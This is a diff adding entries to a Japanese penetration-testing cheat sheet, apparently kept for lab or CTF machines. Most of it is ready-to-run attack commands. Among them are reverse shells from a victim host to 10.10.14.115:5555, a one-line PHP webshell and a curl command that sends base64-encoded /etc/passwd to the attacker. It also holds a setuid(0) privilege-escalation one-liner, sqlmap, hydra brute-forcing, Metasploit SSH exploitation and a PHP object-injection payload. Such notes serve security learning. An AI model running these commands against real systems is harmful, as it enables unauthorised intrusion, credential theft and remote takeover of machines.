@@ -3,15 +3,15 @@
 
 #### nmap
 
-```sudo nmap -sS -p- IP```  
+```sudo nmap -sS -n -p- IP```  
 全ポートのスキャン(時間はかかる)  
 
-```nmap -sV -Pn -A -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,7777,8008,8065,8080,8443,8888 IP```  
+```nmap -sV -n -Pn -A -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,5555,7777,8008,8065,8080,8443,8888 IP```  
 > -sV -A  
 
 でバージョン情報とかを得るようになる(指定しているポートは可能性のありそうなポート)  
 
-```nmap -sV -A -g 53 -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,7777,8008,8065,8080,8443,8888 IP```  
+```nmap -sV -n -A -g 53 -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,5555,7777,8008,8065,8080,8443,8888 IP```  
 > -g 53  
 
 で送信元ポートを53(DNS)に偽装する  
@@ -31,6 +31,21 @@
 > こっちも有り  
 
 <br>  
+
+#### dirsearchとか  
+```dirsearch -u http://127.0.0.1/ -e html,txt,php```  
+> dirsearch  
+
+```gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt -t 15```  
+> gobuster  
+
+
+#### SQL  
+```sqlmap -u http://127.0.0.1/login.php --data "username=1&password=2"```  
+> Postでsqlmap  
+
+
+
 
 #### webshell   
 ```/usr/share/webshells/php/simple-backdoor.php```
@@ -128,7 +143,14 @@ https://github.com/rebootuser/LinEnum
 > payloadにmeterpreterが入っているもをの指定した場合は，msfconsoleのexploit/multi/handlerで待ち受けする(payloadはmsfvenomで使用したものと同じものを指定)  
 
 
-
+#### PHP object injection  
+```O:6:"OBJECT":2:{s:4:"var1";s:5:"test1";s:4:"var2";s:5:"test2";}```  
+> 上記の例解説(よく理解していないので細かいところは間違っているかも)  
+> O:6:"OBJECT" のOBJECTにはインスタンスを作成したいクラス名を指定．一つ前の数字はクラス名の文字列  
+> :2: の2は，値を入れる変数の個数．上記の例ではvar1とvar2の2つ  
+> {} 内で変数名と値を交互に入れる．(使用できる変数名は，クラスの__destruct()を見る)  
+> s:4:"var1"; のvar1は変数名. 4は変数名の文字数  
+> s:5:"test1"; のtest1は値. 5は値の文字列
 
 
 
@@ -149,7 +171,17 @@ https://github.com/rebootuser/LinEnum
 ```victim$ vi ~/.ssh/authorized_keys```  
 ```id_rsa.pubの中身をそのままauthorized_keysにコピー```  
 ```kali$ ssh -i ./id_rsa victim@ip```  
-> sshの公開鍵で接続できるようにする
+> sshの公開鍵で接続できるようにする  
+
+```attacker$ stty raw -echo && socat file:$(tty),raw,unlink-close=0 tcp-listen:5555```  
+```victim$ python -c 'import pty; pty.spawn("/bin/bash")' 9<>/dev/tcp/10.10.14.115/5555 <&9 >&9 2>&9 # pythonを利用する場合```  
+```victim$ script -c 'bash -i' /dev/null 9<>/dev/tcp/10.10.14.115/5555 <&9 >&9 2>&9 # scriptコマンドを利用する場合```  
+> reverse shell tty  
+
+```<?php system($_REQUEST['cmd']); ?>```  
+> 一番シンプル？なWebshell  
+> クエリ文字列として以下のように指定  
+> ?cmd=ls+-la  
 
 
 #### RSA  
@@ -242,8 +274,22 @@ ESC：詳細自動ステップ実行の停止
 
 #### GitLab  
 ```git cat-file -p [40文字]```  
-> 参考 https://www.yoheim.net/blog.php?q=20140210
+> 参考 https://www.yoheim.net/blog.php?q=20140210  
 
+
+#### SSH(Metasploit)  
+```use auxiliary/scanner/ssh/ssh_login```  
+> 認証試行  
+
+```use exploit/multi/ssh/sshexec```  
+> ssh login and spawn meterpreter  
+
+
+#### WPScan  
+```wpscan --url http://target.example.com -v --api-token $WPSCANTOKEN```  
+> 基本のwpscan  
+> api tokenが必要(https://wpscan.com/register) <- free版で良い   
+> 環境変数(WPSCANTOKEN)にapi-tokenを入れてある  
 
 
 #### Shellが安定しないとき  
@@ -269,6 +315,9 @@ ESC：詳細自動ステップ実行の停止
 > カレントディレクトリからサブディレクトリを辿ってroot.txtを検索  
 
 
+#### hydra  
+```# hydra -L [ユーザID辞書ファイル] -P [パスワード辞書ファイル] [対象サーバ名/対象サーバIPアドレス] http-post-form 'パス:クエリ:ログイン失敗文字列'```  
+> memo Uuser=^USER^&PWD=^PASS^
 
 <br>  
 
@@ -278,6 +327,44 @@ ESC：詳細自動ステップ実行の停止
 
 ```less -r logfile```  
 > scriptコマンドで出力したログを表示  
+
+```cherrytree > /dev/null 2>&1 &```  
+> 標準出力なし，バックグラウンドでcherrytree起動  
+
+
+#### コマンドの実行結果を転送  
+```curl localhost:8000/?$(cat /etc/passwd | base64 -w 0)```  
+> 攻撃側の8000番ポートでhttpが待ち受けていることを仮定  
+> 使用時にはlocalhostを攻撃側のipにする  
+
+
+#### Google Dork  
+```cache:```  
+```allinurl:```  
+```inurl:```  
+```allintitle:```  
+```intitle:```  
+```inanchor:```  
+```allinanchor:```  
+```link:```  
+```related:```  
+```info:```  
+```location:```  
+```filetype:```  
+```site:```
+
+
+#### SMB  
+```nmblookup -A [IP]```  
+```nbtscan [IP]```  
+
+
+
+#### Capabilities  
+```getcap -r / 2>/dev/null```  
+> rootに昇格可能な物を見つける
+```./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'```  
+> pythonでuidを0に設定してシェルを起動する例  
 
 
 
